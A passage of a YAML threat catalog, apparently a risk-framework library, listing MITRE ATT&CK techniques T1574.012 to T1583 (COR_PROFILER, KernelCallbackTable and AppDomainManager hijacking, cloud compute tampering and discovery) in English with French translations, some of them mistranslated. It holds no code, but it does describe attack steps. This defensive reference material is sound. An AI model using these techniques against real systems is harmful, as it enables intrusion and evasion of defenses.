          \ le code g\xE9r\xE9 ex\xE9cut\xE9 par le .NET CLR. (Citation : Microsoft\
          \ Profiling mars 2017)(Citation : Microsoft COR_PROFILER f\xE9vr. 2013)\n\
          \nLa variable d\u2019environnement COR_PROFILER peut \xEAtre d\xE9finie\
          \ \xE0 diff\xE9rents niveaux (syst\xE8me, utilisateur ou processus), ce\
          \ qui entra\xEEne diff\xE9rents niveaux d\u2019influence. Les champs de\
          \ port\xE9e des variables syst\xE8me et d\u2019environnement utilisateur\
          \ sont sp\xE9cifi\xE9s dans le Registre, o\xF9 un objet [Component Object\
          \ Model](https://attack.mitre.org/techniques/T1559/001) (COM) peut \xEA\
          tre enregistr\xE9 comme DLL profileur. Un COR_PROFILER de port\xE9e de processus\
          \ peut \xE9galement \xEAtre cr\xE9\xE9 en m\xE9moire sans modifier le Registre.\
          \ \xC0 partir de .NET Framework 4, la DLL de profilage n\u2019a pas besoin\
          \ d\u2019\xEAtre enregistr\xE9e tant que l\u2019emplacement de la DLL est\
          \ sp\xE9cifi\xE9 dans la variable d\u2019environnement COR_PROFILER_PATH.\
          \ (Citation : Microsoft COR_PROFILER f\xE9vr. 2013)\n\nLes adversaires peuvent\
          \ abuser de COR_PROFILER pour \xE9tablir une persistance qui ex\xE9cute\
          \ une DLL malveillante dans le contexte de tous les processus .NET \xE0\
          \ chaque invocation du CLR. Le COR_PROFILER peut \xE9galement \xEAtre utilis\xE9\
          \ pour augmenter les privil\xE8ges (ex : [Contourner le contr\xF4le du compte\
          \ utilisateur](https://attack.mitre.org/techniques/T1548/002)) si le processus\
          \ .NET victime s\u2019ex\xE9cute \xE0 un niveau d\u2019autorisation sup\xE9\
          rieur, ainsi que pour accrocher et compromettre les d\xE9fenses fournies\
          \ par les processus .NET. (Citation : RedCanary Mockingbird mai 2020)(Citation\
          \ : Red Canary COR_PROFILER mai 2020)(Citation : Almond COR_PROFILER avril\
          \ 2019)(Citation : GitHub OmerYa Invisi-Shell)(Citation : subTee .NET Profilers\
          \ mai 2017)\nhttps://attack.mitre.org/techniques/T1574/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.013
    ref_id: T1574.013
    name: KernelCallbackTable
    description: 'Adversaries may abuse the <code>KernelCallbackTable</code> of a
      process to hijack its execution flow in order to run their own payloads.(Citation:
      Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code>
      can be found in the Process Environment Block (PEB) and is initialized to an
      array of graphic functions available to a GUI process once <code>user32.dll</code>
      is loaded.(Citation: Windows Process Injection KernelCallbackTable)


      An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code>
      by replacing an original callback function with a malicious payload. Modifying
      callback functions can be achieved in various ways involving related behaviors
      such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620)
      or [Process Injection](https://attack.mitre.org/techniques/T1055) into another
      process.


      A pointer to the memory address of the <code>KernelCallbackTable</code> can
      be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code>
      [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation:
      NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code>
      can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>)
      set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>).
      The PEB is then updated with the new address of the table. Once the tampered
      function is invoked, the malicious payload will be triggered.(Citation: Lazarus
      APT January 2022)


      The tampered function is typically invoked using a Windows message. After the
      process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code>
      may also be restored to its original state by the rest of the malicious payload.(Citation:
      Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack
      execution flow may evade detection from security products since the execution
      can be masked under a legitimate process.

      https://attack.mitre.org/techniques/T1574/013'
    translations:
      fr:
        name: KernelCallbackTable
        description: "Les adversaires peuvent abuser du <code>KernelCallbackTable</code>\
          \ d\u2019un processus pour d\xE9tourner son flux d\u2019ex\xE9cution afin\
          \ d\u2019ex\xE9cuter leurs propres charges utiles. (Citation : Lazarus APT\
          \ janvier 2022)(Citation : FinFisher d\xE9masqu\xE9) <code>Le KernelCallbackTable</code>\
          \ se trouve dans le Process Environment Block (PEB) et est initialis\xE9\
          \ en un tableau de fonctions graphiques disponibles pour un processus GUI\
          \ une fois <code>user32.dll</code> charg\xE9. (Citation : Windows Process\
          \ Injection KernelCallbackTable)\n\nUn adversaire peut d\xE9tourner le flux\
          \ d\u2019ex\xE9cution d\u2019un processus en utilisant la <code>KernelCallbackTable</code>\
          \ en rempla\xE7ant une fonction de rappel d\u2019origine par une charge\
          \ utile malveillante. La modification des fonctions de rappel peut \xEA\
          tre r\xE9alis\xE9e de diff\xE9rentes mani\xE8res impliquant des comportements\
          \ connexes tels que [Chargement de code r\xE9fl\xE9chissant](https://attack.mitre.org/techniques/T1620)\
          \ ou [Injection de processus](https://attack.mitre.org/techniques/T1055)\
          \ dans un autre processus.\n\nUn pointeur vers l\u2019adresse m\xE9moire\
          \ du <code>KernelCallbackTable</code> peut \xEAtre obtenu en localisant\
          \ le PEB (ex : via un appel \xE0 la fonction <code>NtQueryInformationProcess()</code>\
          \ [API native](https://attack.mitre.org/techniques/T1106)). (Citation :\
          \ NtQueryInformationProcess) Une fois le pointeur localis\xE9, le <code>KernelCallbackTable</code>\
          \ peut \xEAtre dupliqu\xE9, et une fonction dans la table (par exemple,\
          \ <code>fnCOPYDATA</code>) est d\xE9finie \xE0 l\u2019adresse d\u2019une\
          \ charge utile malveillante (ex : via <code>WriteProcessMemory()</code>).\
          \ Le PEB est alors mis \xE0 jour avec la nouvelle adresse du tableau. Une\
          \ fois la fonction alt\xE9r\xE9e invoqu\xE9e, la charge utile malveillante\
          \ sera d\xE9clench\xE9e. (Citation : Lazarus APT janvier 2022)\n\nLa fonction\
          \ alt\xE9r\xE9e est g\xE9n\xE9ralement invoqu\xE9e \xE0 l\u2019aide d\u2019\
          un message Windows. Apr\xE8s le d\xE9tournement du processus et l\u2019\
          ex\xE9cution d\u2019un code malveillant, le <code>KernelCallbackTable</code>\
          \ peut \xE9galement \xEAtre restaur\xE9 \xE0 son \xE9tat d\u2019origine\
          \ par le reste de la charge utile malveillante. (Citation : Lazarus APT\
          \ janvier 2022) L\u2019utilisation du <code>KernelCallbackTable</code> pour\
          \ d\xE9tourner le flux d\u2019ex\xE9cution peut \xE9chapper \xE0 la d\xE9\
          tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9cution peut\
          \ \xEAtre masqu\xE9e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1574/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.014
    ref_id: T1574.014
    name: AppDomainManager
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ how the .NET `AppDomainManager` loads assemblies. The .NET framework uses\
      \ the `AppDomainManager` class to create and manage one or more isolated runtime\
      \ environments (called application domains) inside a process to host the execution\
      \ of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run\
      \ as .NET code) may be loaded into an application domain as executable code.(Citation:\
      \ Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries\
      \ may execute arbitrary code by hijacking how .NET applications load assemblies.\
      \ For example, malware may create a custom application domain inside a target\
      \ process to load and execute an arbitrary assembly. Alternatively, configuration\
      \ files (`.config`) or process environment variables that define .NET runtime\
      \ settings may be tampered with to instruct otherwise benign .NET applications\
      \ to load a malicious assembly (identified by name) into the target process.(Citation:\
      \ PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation:\
      \ Rapid7 AppDomain Manager Injection)\nhttps://attack.mitre.org/techniques/T1574/014"
    translations:
      fr:
        name: AppDomainManager
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant la fa\xE7on dont le \xAB AppDomainManager\
          \ \xBB .NET charge les assemblages. Le framework .NET utilise la classe\
          \ \xAB AppDomainManager \xBB pour cr\xE9er et g\xE9rer un ou plusieurs environnements\
          \ d\u2019ex\xE9cution isol\xE9s (appel\xE9s domaines applicatifs) au sein\
          \ d\u2019un processus afin d\u2019h\xE9berger l\u2019ex\xE9cution d\u2019\
          applications .NET. Les assemblages (binaires \xAB .exe \xBB ou \xAB .dll\
          \ \xBB compil\xE9s pour s\u2019ex\xE9cuter sous forme de code .NET) peuvent\
          \ \xEAtre charg\xE9s dans un domaine d\u2019application en tant que code\
          \ ex\xE9cutable. (Citation : Microsoft App Domains) \n\nConnue sous le nom\
          \ d'\xAB injection AppDomainManager \xBB, les adversaires peuvent ex\xE9\
          cuter un code arbitraire en d\xE9tournant la fa\xE7on dont les applications\
          \ .NET chargent les assemblies. Par exemple, un logiciel malveillant peut\
          \ cr\xE9er un domaine d\u2019application personnalis\xE9 \xE0 l\u2019int\xE9\
          rieur d\u2019un processus cible pour charger et ex\xE9cuter un assembleur\
          \ arbitraire. Alternativement, les fichiers de configuration ('.config')\
          \ ou les variables d\u2019environnement de processus qui d\xE9finissent\
          \ les param\xE8tres d\u2019ex\xE9cution .NET peuvent \xEAtre modifi\xE9\
          s pour ordonner \xE0 des applications .NET autrement inoffensives de charger\
          \ un assembleur malveillant (identifi\xE9 par son nom) dans le processus\
          \ cible. (Citation : PenTestLabs AppDomainManagerInject)(Citation : PwC\
          \ Yellow Liderc)(Citation : Injection du gestionnaire de domaine AppDomain\
          \ Rapid7)\nhttps://attack.mitre.org/techniques/T1574/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578
    ref_id: T1578
    name: Modify Cloud Compute Infrastructure
    description: 'An adversary may attempt to modify a cloud account''s compute service
      infrastructure to evade defenses. A modification to the compute service infrastructure
      can include the creation, deletion, or modification of one or more components
      such as compute instances, virtual machines, and snapshots.


      Permissions gained from the modification of infrastructure components may bypass
      restrictions that prevent access to existing infrastructure. Modifying infrastructure
      components may also allow an adversary to evade detection and remove evidence
      of their presence.(Citation: Mandiant M-Trends 2020)

      https://attack.mitre.org/techniques/T1578'
    translations:
      fr:
        name: "Modifier l\u2019infrastructure de calcul cloud"
        description: "Un adversaire peut tenter de modifier l\u2019infrastructure\
          \ des services de calcul d\u2019un compte cloud pour contourner les d\xE9\
          fenses. Une modification de l\u2019infrastructure des services de calcul\
          \ peut inclure la cr\xE9ation, la suppression ou la modification d\u2019\
          un ou plusieurs composants tels que des instances de calcul, des machines\
          \ virtuelles et des instantan\xE9s.\n\nLes autorisations obtenues lors de\
          \ la modification des composants d\u2019infrastructure peuvent contourner\
          \ les restrictions qui emp\xEAchent l\u2019acc\xE8s \xE0 l\u2019infrastructure\
          \ existante. Modifier les composants de l\u2019infrastructure peut \xE9\
          galement permettre \xE0 un adversaire d\u2019\xE9chapper \xE0 la d\xE9tection\
          \ et d\u2019\xE9liminer les preuves de sa pr\xE9sence. (Citation : Mandiant\
          \ M-Trends 2020)\nhttps://attack.mitre.org/techniques/T1578"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.001
    ref_id: T1578.001
    name: Create Snapshot
    description: 'An adversary may create a snapshot or data backup within a cloud
      account to evade defenses. A snapshot is a point-in-time copy of an existing
      cloud compute component such as a virtual machine (VM), virtual hard drive,
      or volume. An adversary may leverage permissions to create a snapshot in order
      to bypass restrictions that prevent access to existing compute service infrastructure,
      unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004)
      where an adversary may revert to a snapshot to evade detection and remove evidence
      of their presence.


      An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002),
      mount one or more created snapshots to that instance, and then apply a policy
      that allows the adversary access to the created instance, such as a firewall
      policy that allows them inbound and outbound SSH access.(Citation: Mandiant
      M-Trends 2020)

      https://attack.mitre.org/techniques/T1578/001'
    translations:
      fr:
        name: "Cr\xE9er un instantan\xE9"
        description: "Un adversaire peut cr\xE9er un instantan\xE9 ou une sauvegarde\
          \ de donn\xE9es au sein d\u2019un compte cloud pour \xE9chapper aux d\xE9\
          fenses. Un instantan\xE9 est une copie instantan\xE9e d\u2019un composant\
          \ de cloud computing existant, tel qu\u2019une machine virtuelle (VM), un\
          \ disque dur virtuel ou un volume. Un adversaire peut tirer parti des permissions\
          \ pour cr\xE9er un instantan\xE9 afin de contourner les restrictions qui\
          \ emp\xEAchent l\u2019acc\xE8s \xE0 l\u2019infrastructure existante des\
          \ services de calcul, contrairement \xE0 [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004)\
          \ o\xF9 un adversaire peut revenir \xE0 un instantan\xE9 pour \xE9chapper\
          \ \xE0 la d\xE9tection et \xE9liminer les preuves de sa pr\xE9sence.\n\n\
          Un adversaire peut [Cr\xE9er une instance cloud](https://attack.mitre.org/techniques/T1578/002),\
          \ monter un ou plusieurs instantan\xE9s cr\xE9\xE9s sur cette instance,\
          \ puis appliquer une politique permettant \xE0 l\u2019adversaire d\u2019\
          acc\xE9der \xE0 l\u2019instance cr\xE9\xE9e, telle qu\u2019une politique\
          \ de pare-feu lui permettant un acc\xE8s SSH entrant et sortant. (Citation\
          \ : Mandiant M-Trends 2020)\nhttps://attack.mitre.org/techniques/T1578/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.002
    ref_id: T1578.002
    name: Create Cloud Instance
    description: 'An adversary may create a new instance or virtual machine (VM) within
      the compute service of a cloud account to evade defenses. Creating a new instance
      may allow an adversary to bypass firewall rules and permissions that exist on
      instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001)
      of one or more volumes in an account, create a new instance, mount the snapshots,
      and then apply a less restrictive security policy to collect [Data from Local
      System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation:
      Mandiant M-Trends 2020)


      Creating a new instance may also allow an adversary to carry out malicious activity
      within an environment without affecting the execution of current running instances.

      https://attack.mitre.org/techniques/T1578/002'
    translations:
      fr:
        name: "Cr\xE9er une instance cloud"
        description: "Un adversaire peut cr\xE9er une nouvelle instance ou machine\
          \ virtuelle (VM) au sein du service de calcul d\u2019un compte cloud pour\
          \ contourner les d\xE9fenses. La cr\xE9ation d\u2019une nouvelle instance\
          \ peut permettre \xE0 un adversaire de contourner les r\xE8gles et permissions\
          \ du pare-feu existant sur des instances actuellement pr\xE9sentes dans\
          \ un compte. Un adversaire peut [Cr\xE9er un instantan\xE9](https://attack.mitre.org/techniques/T1578/001)\
          \ d\u2019un ou plusieurs volumes dans un compte, cr\xE9er une nouvelle instance,\
          \ monter les instantan\xE9s, puis appliquer une politique de s\xE9curit\xE9\
          \ moins restrictive pour collecter [Donn\xE9es du Syst\xE8me local](https://attack.mitre.org/techniques/T1005)\
          \ ou pour [\xC9talage de donn\xE9es distant](https://attack.mitre.org/techniques/T1074/002).\
          \ (Citation : Mandiant M-Trends 2020)\n\nLa cr\xE9ation d\u2019une nouvelle\
          \ instance peut \xE9galement permettre \xE0 un adversaire d\u2019effectuer\
          \ une activit\xE9 malveillante dans un environnement sans affecter l\u2019\
          ex\xE9cution des instances en cours.\nhttps://attack.mitre.org/techniques/T1578/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.003
    ref_id: T1578.003
    name: Delete Cloud Instance
    description: 'An adversary may delete a cloud instance after they have performed
      malicious activities in an attempt to evade detection and remove evidence of
      their presence.  Deleting an instance or virtual machine can remove valuable
      forensic artifacts and other evidence of suspicious behavior if the instance
      is not recoverable.


      An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
      and later terminate the instance after achieving their objectives.(Citation:
      Mandiant M-Trends 2020)

      https://attack.mitre.org/techniques/T1578/003'
    translations:
      fr:
        name: "Supprimer l\u2019instance Cloud"
        description: "Un adversaire peut supprimer une instance cloud apr\xE8s avoir\
          \ effectu\xE9 des activit\xE9s malveillantes dans le but d\u2019\xE9chapper\
          \ \xE0 la d\xE9tection et d\u2019\xE9liminer les preuves de sa pr\xE9sence.\
          \  Supprimer une instance ou une machine virtuelle peut supprimer des artefacts\
          \ m\xE9dico-l\xE9gaux pr\xE9cieux et d\u2019autres preuves de comportement\
          \ suspect si l\u2019instance n\u2019est pas r\xE9cup\xE9rable.\n\nUn adversaire\
          \ peut \xE9galement [Cr\xE9er une instance cloud](https://attack.mitre.org/techniques/T1578/002)\
          \ puis terminer l\u2019instance apr\xE8s avoir atteint ses objectifs. (Citation\
          \ : Mandiant M-Trends 2020)\nhttps://attack.mitre.org/techniques/T1578/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.004
    ref_id: T1578.004
    name: Revert Cloud Instance
    description: 'An adversary may revert changes made to a cloud instance after they
      have performed malicious activities in attempt to evade detection and remove
      evidence of their presence. In highly virtualized environments, such as cloud-based
      infrastructure, this may be accomplished by restoring virtual machine (VM) or
      data storage snapshots through the cloud management dashboard or cloud APIs.


      Another variation of this technique is to utilize temporary storage attached
      to the compute instance. Most cloud providers provide various types of storage
      including persistent, local, and/or ephemeral, with the ephemeral types often
      reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation:
      Google - Restore Cloud Snapshot)

      https://attack.mitre.org/techniques/T1578/004'
    translations:
      fr:
        name: Revert Cloud Instance
        description: "Un adversaire peut annuler les modifications apport\xE9es \xE0\
          \ une instance cloud apr\xE8s avoir effectu\xE9 des activit\xE9s malveillantes\
          \ dans le but d\u2019\xE9chapper \xE0 la d\xE9tection et d\u2019\xE9liminer\
          \ les preuves de sa pr\xE9sence. Dans des environnements hautement virtualis\xE9\
          s, tels que l\u2019infrastructure bas\xE9e sur le cloud, cela peut \xEA\
          tre r\xE9alis\xE9 en restaurant des instantan\xE9s de machines virtuelles\
          \ (VM) ou de stockage de donn\xE9es via le tableau de bord de gestion cloud\
          \ ou les API cloud.\n\nUne autre variante de cette technique consiste \xE0\
          \ utiliser un stockage temporaire attach\xE9 \xE0 l\u2019instance de calcul.\
          \ La plupart des fournisseurs cloud proposent divers types de stockage,\
          \ y compris persistants, locaux et/ou \xE9ph\xE9m\xE8res, les types \xE9\
          ph\xE9m\xE8res \xE9tant souvent r\xE9initialis\xE9s lors de l\u2019arr\xEA\
          t ou du red\xE9marrage de la VM. (Citation : Tech Republic - Restaurez les\
          \ instantan\xE9s AWS)(Citation : Google - Restaurer l\u2019instantan\xE9\
          \ cloud)\nhttps://attack.mitre.org/techniques/T1578/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.005
    ref_id: T1578.005
    name: Modify Cloud Compute Configurations
    description: "Adversaries may modify settings that directly affect the size, locations,\
      \ and resources available to cloud compute infrastructure in order to evade\
      \ defenses. These settings may include service quotas, subscription associations,\
      \ tenant-wide policies, or other configurations that impact available compute.\
      \ Such modifications may allow adversaries to abuse the victim\u2019s compute\
      \ resources to achieve their goals, potentially without affecting the execution\
      \ of running instances and/or revealing their activities to the victim.\n\n\
      For example, cloud providers often limit customer usage of compute resources\
      \ via quotas. Customers may request adjustments to these quotas to support increased\
      \ computing needs, though these adjustments may require approval from the cloud\
      \ provider. Adversaries who compromise a cloud environment may similarly request\
      \ quota adjustments in order to support their activities, such as enabling additional\
      \ [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising\
      \ suspicion by using up a victim\u2019s entire quota.(Citation: Microsoft Cryptojacking\
      \ 2023) Adversaries may also increase allowed resource usage by modifying any\
      \ tenant-wide policies that limit the sizes of deployed virtual machines.(Citation:\
      \ Microsoft Azure Policy)\n\nAdversaries may also modify settings that affect\
      \ where cloud resources can be deployed, such as enabling [Unused/Unsupported\
      \ Cloud Regions](https://attack.mitre.org/techniques/T1535).\nhttps://attack.mitre.org/techniques/T1578/005"
    translations:
      fr:
        name: Modifier les configurations de calcul cloud
        description: "Les adversaires peuvent modifier des param\xE8tres qui affectent\
          \ directement la taille, les emplacements et les ressources disponibles\
          \ pour l\u2019infrastructure de cloud computing afin d\u2019\xE9chapper\
          \ aux d\xE9fenses. Ces param\xE8tres peuvent inclure des quotas de service,\
          \ des associations d\u2019abonnement, des politiques \xE0 l\u2019\xE9chelle\
          \ du locataire ou d\u2019autres configurations qui impactent le calcul disponible.\
          \ De telles modifications peuvent permettre aux adversaires d\u2019abuser\
          \ des ressources informatiques de la victime pour atteindre leurs objectifs,\
          \ potentiellement sans affecter l\u2019ex\xE9cution des instances en cours\
          \ et/ou sans r\xE9v\xE9ler leurs activit\xE9s \xE0 la victime.\n\nPar exemple,\
          \ les fournisseurs cloud limitent souvent l\u2019utilisation des ressources\
          \ de calcul par les clients via des quotas. Les clients peuvent demander\
          \ des ajustements \xE0 ces quotas pour r\xE9pondre \xE0 des besoins informatiques\
          \ accrus, bien que ces ajustements puissent n\xE9cessiter l\u2019approbation\
          \ du fournisseur cloud. Les adversaires qui compromettent un environnement\
          \ cloud peuvent \xE9galement demander des ajustements de quotas afin de\
          \ soutenir leurs activit\xE9s, comme permettre un [d\xE9tournement de ressources\
          \ suppl\xE9mentaires](https://attack.mitre.org/techniques/T1496) sans \xE9\
          veiller de soup\xE7ons en \xE9puisant l\u2019int\xE9gralit\xE9 du quota\
          \ de la victime. (Citation : Microsoft Cryptojacking 2023) Les adversaires\
          \ peuvent \xE9galement augmenter l\u2019utilisation autoris\xE9e des ressources\
          \ en modifiant toute politique \xE0 l\u2019\xE9chelle du locataire qui limite\
          \ la taille des machines virtuelles d\xE9ploy\xE9es. (Citation : Microsoft\
          \ Azure Policy)\n\nLes adversaires peuvent \xE9galement modifier les param\xE8\
          tres qui influencent le lieu de d\xE9ploiement des ressources cloud, comme\
          \ l\u2019activation des [R\xE9gions Cloud Inutilis\xE9es/Non Support\xE9\
          es](https://attack.mitre.org/techniques/T1535).\nhttps://attack.mitre.org/techniques/T1578/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1580
    ref_id: T1580
    name: Cloud Infrastructure Discovery
    description: "An adversary may attempt to discover infrastructure and resources\
      \ that are available within an infrastructure-as-a-service (IaaS) environment.\
      \ This includes compute service resources such as instances, virtual machines,\
      \ and snapshots as well as resources of other services including the storage\
      \ and database services.\n\nCloud providers offer methods such as APIs and commands\
      \ issued through CLIs to serve information about infrastructure. For example,\
      \ AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API\
      \ that can return information about one or more instances within an account,\
      \ the <code>ListBuckets</code> API that returns a list of all buckets owned\
      \ by the authenticated sender of the request, the <code>HeadBucket</code> API\
      \ to determine a bucket\u2019s existence along with access permissions of the\
      \ request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access\
      \ block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation:\
      \ Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation:\
      \ AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud\
      \ compute instances list</code> command to list all Google Compute Engine instances\
      \ in a project (Citation: Google Compute Instances), and Azure's CLI command\
      \ <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft\
      \ AZ CLI) In addition to API commands, adversaries can utilize open source tools\
      \ to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation:\
      \ Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate\
      \ resources using a compromised user's access keys to determine which are available\
      \ to that user.(Citation: Expel IO Evil in AWS) The discovery of these available\
      \ resources may help adversaries determine their next steps in the Cloud environment,\
      \ such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary\
      \ may also use this information to change the configuration to make the bucket\
      \ publicly accessible, allowing data to be accessed without authentication.\
      \ Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code>\
      \ to determine size, owner, permissions, and network ACLs of database resources.\
      \ (Citation: AWS Describe DB Instances) Adversaries can use this information\
      \ to determine the potential value of databases and discover the requirements\
      \ to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526),\
      \ this technique focuses on the discovery of components of the provided services\
      \ rather than the services themselves.\nhttps://attack.mitre.org/techniques/T1580"
    translations:
      fr:
        name: "D\xE9couverte de l\u2019infrastructure cloud"
        description: "Un adversaire peut tenter de d\xE9couvrir des infrastructures\
          \ et des ressources disponibles dans un environnement d\u2019infrastructure\
          \ en tant que service (IaaS). Cela inclut les ressources des services de\
          \ calcul telles que les instances, les machines virtuelles et les instantan\xE9\
          s, ainsi que les ressources d\u2019autres services, y compris les services\
          \ de stockage et de base de donn\xE9es.\n\nLes fournisseurs cloud proposent\
          \ des m\xE9thodes telles que des API et des commandes \xE9mises via des\
          \ interfaces cl\xE9s de cr\xE9dit pour fournir des informations sur l\u2019\
          infrastructure. Par exemple, AWS fournit une API <code>DescribeInstances</code>\
          \ au sein de l\u2019API Amazon EC2 qui peut renvoyer des informations sur\
          \ une ou plusieurs instances dans un compte, <code>l\u2019API ListBuckets</code>\
          \ qui renvoie une liste de tous les buckets appartenant \xE0 l\u2019exp\xE9\
          diteur authentifi\xE9 de la requ\xEAte, <code>l\u2019API HeadBucket</code>\
          \ pour d\xE9terminer l\u2019existence d\u2019un seau ainsi que les permissions\
          \ d\u2019acc\xE8s de l\u2019exp\xE9diteur de la requ\xEAte,  ou l\u2019\
          API <code>GetPublicAccessBlock</code> pour r\xE9cup\xE9rer la configuration\
          \ du bloc d\u2019acc\xE8s pour un bucket. (Citation : Amazon Describe Instance)(Citation\
          \ : API Amazon Describe Instances)(Citation : AWS Get Public Access Block)(Citation\
          \ : Seau de t\xEAte AWS) De m\xEAme, la CLI du Cloud SDK de GCP fournit\
          \ la commande <code>gcloud compute instances list</code> pour lister toutes\
          \ les instances Google Compute Engine dans un projet (Citation : Google\
          \ Compute Instances), et la commande CLI <code>az-vm list</code> d\u2019\
          Azure liste les d\xE9tails des machines virtuelles. (Citation : Microsoft\
          \ AZ CLI) En plus des commandes API, les adversaires peuvent utiliser des\
          \ outils open source pour d\xE9couvrir l\u2019infrastructure de stockage\
          \ cloud via [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).\
          \ (Citation : Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nUn adversaire\
          \ peut \xE9num\xE9rer les ressources en utilisant les cl\xE9s d\u2019acc\xE8\
          s d\u2019un utilisateur compromis pour d\xE9terminer lesquelles sont disponibles\
          \ pour cet utilisateur. (Citation : Expulser IO Evil dans AWS) La d\xE9\
          couverte de ces ressources disponibles pourrait aider les adversaires \xE0\
          \ d\xE9terminer leurs prochaines \xE9tapes dans l\u2019environnement cloud,\
          \ comme l\u2019\xE9tablissement de la persistance. (Citation : Mandiant\
          \ M-Trends 2020)Un adversaire peut \xE9galement utiliser ces informations\
          \ pour modifier la configuration afin de rendre le compartiment accessible\
          \ au public, permettant ainsi d\u2019acc\xE9der aux donn\xE9es sans authentification.\
          \ Les adversaires ont \xE9galement pu utiliser des API de d\xE9couverte\
          \ d\u2019infrastructure telles que <code>DescribeDBInstances</code> pour\
          \ d\xE9terminer la taille, le propri\xE9taire, les permissions et les ACL\
          \ r\xE9seau des ressources de la base de donn\xE9es. (Citation : AWS d\xE9\
          crit les instances de base de donn\xE9es) Les adversaires peuvent utiliser\
          \ ces informations pour d\xE9terminer la valeur potentielle des bases de\
          \ donn\xE9es et d\xE9couvrir les exigences pour y acc\xE9der. Contrairement\
          \ \xE0 [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526),\
          \ cette technique se concentre sur la d\xE9couverte des composants des services\
          \ fournis plut\xF4t que sur les services eux-m\xEAmes.\nhttps://attack.mitre.org/techniques/T1580"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583
    ref_id: T1583
    name: Acquire Infrastructure
    description: 'Adversaries may buy, lease, rent, or obtain infrastructure that
      can be used during targeting. A wide variety of infrastructure exists for hosting
      and orchestrating adversary operations. Infrastructure solutions include physical
      or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease)
      Some infrastructure providers offer free trial periods, enabling infrastructure
      acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally,
      botnets are available for rent or purchase.


      Use of these infrastructure solutions allows adversaries to stage, launch, and
      execute operations. Solutions may help adversary operations blend in with traffic
      that is seen as normal, such as contacting third-party web services or acquiring
      infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090),
      including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation:
      FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022)
      Depending on the implementation, adversaries may use infrastructure that makes
      it difficult to physically tie back to them as well as utilize infrastructure
      that can be rapidly provisioned, modified, and shut down.

      https://attack.mitre.org/techniques/T1583'
    translations:
      fr:
        name: "Acqu\xE9rir des infrastructures"
        description: "Les adversaires peuvent acheter, louer, louer ou acqu\xE9rir\
          \ des infrastructures pouvant \xEAtre utilis\xE9es lors du ciblage. Une\
          \ grande vari\xE9t\xE9 d\u2019infrastructures existe pour accueillir et\
          \ orchestrer les op\xE9rations adverses. Les solutions d\u2019infrastructure\
          \ incluent les serveurs physiques ou cloud, les domaines et les services\
          \ web tiers. (Citation : TrendmicroHideoutsLease) Certains fournisseurs\
          \ d\u2019infrastructures proposent des p\xE9riodes d\u2019essai gratuites,\
          \ permettant l\u2019acquisition d\u2019infrastructures \xE0 des frais limit\xE9\
          s ou gratuits. (Citation : Essai gratuit PurpleUrchin) De plus, des botnets\
          \ sont disponibles \xE0 la location ou \xE0 l\u2019achat.\n\nL\u2019utilisation\
          \ de ces solutions d\u2019infrastructure permet aux adversaires de mettre\
          \ en place, de lancer et d\u2019ex\xE9cuter des op\xE9rations. Les solutions\
          \ peuvent aider les op\xE9rations adverses \xE0 s\u2019int\xE9grer au trafic\
          \ consid\xE9r\xE9 comme normal, comme contacter des services web tiers ou\
          \ acqu\xE9rir une infrastructure pour supporter [Proxy](https://attack.mitre.org/techniques/T1090),\
